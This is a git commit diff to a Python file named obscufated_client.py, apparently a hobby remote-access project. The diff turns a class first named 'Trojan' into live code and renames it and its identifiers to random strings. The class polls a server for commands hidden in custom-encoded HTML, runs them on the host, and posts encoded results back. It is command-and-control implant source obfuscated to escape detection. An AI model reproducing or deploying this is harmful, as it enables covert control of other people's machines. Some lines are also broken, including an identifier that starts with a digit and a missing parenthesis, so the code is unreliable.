000605c53f404fd6d83ae282660b3ab5cac24850
ben Cookson <98530526+MITwannabe101@users.noreply.github.com>
2022-05-27 12:45:03 +0100

    Update obscufated_client.py

--- http/client/obscufated_client.py
+++ http/client/obscufated_client.py
@@ -1,7 +1,6 @@
-"""import urllib.request as request
+import urllib.request as request
 import urllib.parse as parse
 from urllib.parse import quote, unquote
-
 import json
 import os
 import sys
@@ -9,15 +8,11 @@ import random
 import base64
 import platform
 
-
 def encrypt(plaintext: str) -> str:
     randomtext = ''
     for i in range(len(plaintext)):
-        randomtext += plaintext[i]
-        randomtext += chr(random.randint(33, 126))
-    binarytext = ''.join(format(ord(i), '08b') for i in randomtext)
-    binarytext = binarytext
-    base64text = str(base64.b64encode(binarytext.encode('utf-8')))[2:-1] 
+        randomtext += plaintext[i] + chr(random.randint(33, 126))
+    base64text = str(base64.b64encode(''.join(format(ord(i), '08b') for i in randomtext).encode('utf-8')))[2:-1] 
     randombase64text = ''
     for i in range(len(str(base64text))):
         randombase64text  += str(base64text)[i]
@@ -25,19 +20,12 @@ def encrypt(plaintext: str) -> str:
     html = ('<!doctype html><body>^%s^</body></doctype>' % randombase64text)
     return html
 
-
-def decrypt(html : str) -> str:
-    start = html.find('^') + 1
-    end = -(html[::-1].find('^') +1)
-    base64text = html[start:end]
-    base64text_norandom = base64text[::2]
-    binarytext = base64.b64decode(base64text_norandom.encode('latin-1'))
-    randomtext = ''.join(chr(int(binarytext[i*8:i*8+8],2)) for i in range(len(binarytext)//8))
-    plaintext = randomtext[::2]
-    return plaintext"""
+def SzFcdBS0ivd(k9yIBVGfdifHxl) -> str:
+    return ''.join(chr(int(base64.b64decode(k9yIBVGfdifHxl[(k9yIBVGfdifHxl.find('^') + 1):-(k9yIBVGfdifHxl[::-1].find('^') +1):2].encode('latin-1'))[i*8:i*8+8],2) \
+                             ) for i in range(len(base64.b64decode(k9yIBVGfdifHxl[(k9yIBVGfdifHxl.find('^') + 1):-(k9yIBVGfdifHxl[::-1].find('^') +1):2].encode('latin-1')))//8))[::2]
 
 
-class Trojan:
+class FdLYvtTOT9x:
     def __init__(r0VZS8aLng, Z96YE6gMyHNNWaW3UpZ,\
                 H7KBljw8yHtHm_Kt8_8v='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36',\
                 A0ZHF2Jp0myE0a = platform.node(), **VWyKlUOzs5LBUj6j):
@@ -47,21 +35,21 @@ class Trojan:
         r0VZS8aLng.VWyKlUOzs5LBUj6j = {'computer-id':r0VZS8aLng.A0ZHF2Jp0myE0a, 'User-agent' : r0VZS8aLng.H7KBljw8yHtHm_Kt8_8v}
         r0VZS8aLng.VWyKlUOzs5LBUj6j.update(VWyKlUOzs5LBUj6j)
     
-    def auJxN1d(r0VZS8aLng) -> dict:
+    def auJxN1d(r0VZS8aLng):
         BQj5tD4G3iJimSIn7_0D = request.Request(r0VZS8aLng.Z96YE6gMyHNNWaW3UpZ, headers = r0VZS8aLng.VWyKlUOzs5LBUj6j)
         with request.urlopen(BQj5tD4G3iJimSIn7_0D) as 4nS7cJDGZ:
             fblZMZgOoaZr2B = 4nS7cJDGZ.read()
             fblZMZgOoaZr2B = fblZMZgOoaZr2B.decode()
-        H9qpETN7XAC_124 = decrypt(fblZMZgOoaZr2B)
-        commands = ''
+        H9qpETN7XAC_124 = SzFcdBS0ivd(fblZMZgOoaZr2B)
+        kjdfCqDI3fH = ''
         try:
-            commands = json.loads(H9qpETN7XAC_124)
+            kjdfCqDI3fH = json.loads(H9qpETN7XAC_124)
         except json.JSONDecodeError:
             H9qpETN7XAC_124 = H9qpETN7XAC_124.replace('\'', '"')
-            commands = json.loads(H9qpETN7XAC_124)
-        return commands
+            kjdfCqDI3fH = json.loads(H9qpETN7XAC_124)
+        return kjdfCqDI3fH
     
-    """def sendoutcome(r0VZS8aLng, jgYcNro: dict) -> str:
+    def sendoutcome(r0VZS8aLng, jgYcNro: dict) -> str:
         print('[*] -> sending ', jgYcNro)
         hZVnw04yhD = parse.quote(encrypt(str(jgYcNro))).encode('utf-8')
         eK2E6SFiPeUFuE0I = request.Request(r0VZS8aLng.Z96YE6gMyHNNWaW3UpZ, data=hZVnw04yhD, headers = r0VZS8aLng.VWyKlUOzs5LBUj6j)
@@ -126,7 +114,7 @@ class Trojan:
                         jgLOV1mnqvrVfi7 = e
                     htrHKQg_mm5['p_1io3vQuuA'].append([GLusu2aBblLHF, jgLOV1mnqvrVfi7])
         htrHKQg_mm5 = str(htrHKQg_mm5)
-        r0VZS8aLng.sendoutcome(htrHKQg_mm5)"""
-        
-"""trojan = Trojan('http://127.0.0.1:8000')
+        r0VZS8aLng.sendoutcome(htrHKQg_mm5
+
+trojan = FdLYvtTOT9x('http://127.0.0.1:8000')
 trojan.R9eapaCq7pEl0oqx()"""
